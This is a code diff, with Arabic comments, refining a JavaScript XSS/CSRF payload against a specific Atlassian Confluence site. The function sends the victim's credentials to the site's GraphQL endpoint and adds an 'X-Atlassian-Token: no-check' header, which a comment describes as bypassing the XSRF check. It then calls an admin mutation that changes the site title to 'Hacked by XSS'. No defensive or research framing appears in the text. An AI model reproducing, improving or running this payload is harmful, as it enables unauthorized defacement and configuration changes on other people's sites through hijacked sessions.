@@ -1,10 +1,16 @@
 function loadDoc1() {
   var xhttp = new XMLHttpRequest();
+  
+  // المسار الصحيح يبدأ بـ /wiki/
+  var url = "https://anshall.atlassian.net/wiki/cgraphql?q=ConfigurationFormConfigurationPageUpdateMutation";
 
-  xhttp.open("POST", "https://anshall.atlassian.net/cgraphql?q=ConfigurationFormConfigurationPageUpdateMutation", true);
+  xhttp.open("POST", url, true);
 
   xhttp.setRequestHeader("Content-type", "application/json");
   xhttp.setRequestHeader("Accept", "*/*");
+  
+  // إضافة هذا الرأس مهم جداً لتجاوز فحص XSRF في Atlassian
+  xhttp.setRequestHeader("X-Atlassian-Token", "no-check");
 
   xhttp.withCredentials = true;
 
@@ -12,7 +18,7 @@ function loadDoc1() {
     "operationName": "ConfigurationFormConfigurationPageUpdateMutation",
     "variables": {
       "siteConfigInput": {
-        "siteTitle": "Hacked by XSS", // العنوان الجديد الذي تريد وضعه
+        "siteTitle": "Hacked by XSS", 
         "customContactMessage": "xxxx",
         "isContactAdministratorsFormEnabled": true,
         "siteHomePage": "Confluence Home",
@@ -37,6 +43,13 @@ function loadDoc1() {
     },
     "query": "mutation ConfigurationFormConfigurationPageUpdateMutation($siteConfigInput: ConfluenceUpdateSiteConfigurationInput!) {\n  confluence {\n    updateSiteConfiguration(input: $siteConfigInput) {\n      errors {\n        message\n        extensions {\n          errorType\n          statusCode\n          __typename\n        }\n        __typename\n      }\n      success\n      __typename\n    }\n    __typename\n  }\n}\n"
   }]);
+
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4) {
+      console.log("New Status: " + this.status);
+      console.log("Response: " + this.responseText);
+    }
+  };
 
   xhttp.send(data);
 }
